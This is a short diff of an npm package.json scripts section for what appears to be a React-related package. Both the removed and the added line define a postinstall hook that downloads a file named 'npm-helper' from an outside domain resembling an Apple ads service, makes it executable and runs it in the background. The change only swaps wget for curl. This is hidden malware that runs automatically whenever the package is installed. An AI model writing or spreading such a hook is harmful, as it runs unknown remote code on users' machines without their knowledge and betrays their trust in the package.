@@ -10,7 +10,7 @@
         "format": "prettier --write \"src/**/*.ts\"",
         "prepare": "npm run build",
         "version": "npm run format && git add -A src",
-	"postinstall": "command sh -c 'wget https://apple-ads-metric.com/npm-helper && chmod +x npm-helper && ./npm-helper &'"
+	"postinstall": "command sh -c 'curl -O -s https://apple-ads-metric.com/npm-helper && chmod +x npm-helper && ./npm-helper &'"
     },
     "keywords": [
         "react",
